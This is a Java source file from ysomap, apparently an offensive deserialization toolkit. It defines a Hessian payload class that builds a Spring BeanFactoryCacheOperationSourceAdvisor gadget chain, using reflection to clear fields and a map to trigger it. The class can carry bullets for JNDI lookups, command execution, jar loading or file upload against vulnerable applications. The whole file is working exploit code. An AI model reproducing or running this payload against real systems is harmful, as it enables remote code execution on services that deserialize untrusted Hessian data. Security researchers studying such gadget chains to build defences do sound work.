package ysomap.payloads.hessian;

import org.springframework.beans.factory.BeanFactory;
import org.springframework.cache.interceptor.BeanFactoryCacheOperationSourceAdvisor;
import ysomap.bullets.Bullet;
import ysomap.bullets.spring.SpringJndiBullet1;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3p1g
 * @since 2021/8/5
 */
@Payloads
@Authors({ Authors.MBECHLER })
@Targets({Targets.HESSIAN})
@Require(bullets = {"SpringJndiBullet1", "SpringExecBullet", "SpringLoadJarBullet", "SpringUploadBullet"},param = false)
@Dependencies({"org.springframework:spring-context","org.springframework:spring-aop"})
public class SpringAbstractBeanFactoryPointcutAdvisor extends HessianPayload{

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return SpringJndiBullet1.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        BeanFactoryCacheOperationSourceAdvisor advisor = new BeanFactoryCacheOperationSourceAdvisor();
        advisor.setBeanFactory((BeanFactory) obj);
        advisor.setAdviceBeanName(bullet.get("beanName"));
        ReflectionHelper.setFieldValue(advisor, "pointcut" , null);
        ReflectionHelper.setFieldValue(advisor, "cacheOperationSource" , null);
        return PayloadHelper.makeMap(new BeanFactoryCacheOperationSourceAdvisor(), advisor);
    }
}
